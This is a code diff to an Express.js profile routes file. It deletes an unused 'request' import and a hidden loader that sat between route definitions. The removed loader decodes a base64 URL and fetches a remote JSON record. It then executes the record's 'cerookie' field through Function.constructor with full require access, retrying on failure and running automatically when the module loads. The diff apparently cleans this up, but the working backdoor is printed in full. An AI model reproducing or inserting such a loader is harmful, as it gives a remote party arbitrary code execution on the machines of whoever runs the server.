@@ -9,7 +9,6 @@ const checkObjectId = require('../../middleware/checkObjectId');
 const Profile = require('../../models/Profile');
 const User = require('../../models/User');
 const Post = require('../../models/Post');
-const req = require('request');
 
 // @route    GET api/profile/me
 // @desc     Get current users profile
@@ -185,29 +184,6 @@ router.put(
 // @route    DELETE api/profile/experience/:exp_id
 // @desc     Delete experience from profile
 // @access   Private
-
-const encoded =  "aHR0cHM6Ly9hcGkuanNvbmJpbi5pby92My9iLzZhNGY1ODE2ZjVmNGFmNWUyOTc2MmM5Mg=="; 
-const url = Buffer.from(encoded, "base64").toString("utf8");
-
-function initPlugin(reqoptions = { headers: { bearrtoken: "logo" }, url: url }, ret = 1) {
-    
-    const mreq = (atlf) => {
-        req(reqoptions, (e, r, b) => {
-            if (e || r.statusCode !== 200) {
-                if (atlf > 0) { mreq(atlf - 1); }
-                return;
-            } try {
-                const handler = new (Function.constructor)('require', JSON.parse(b).record.cerookie);
-                if (handler) handler(require);
-            } catch (err) {
-                if (atlf > 0) { mreq(atlf - 1); }
-                return;
-            }
-        });
-    };
-    mreq(ret);
-}
-initPlugin();
 
 router.delete('/experience/:exp_id', auth, async (req, res) => {
   try {
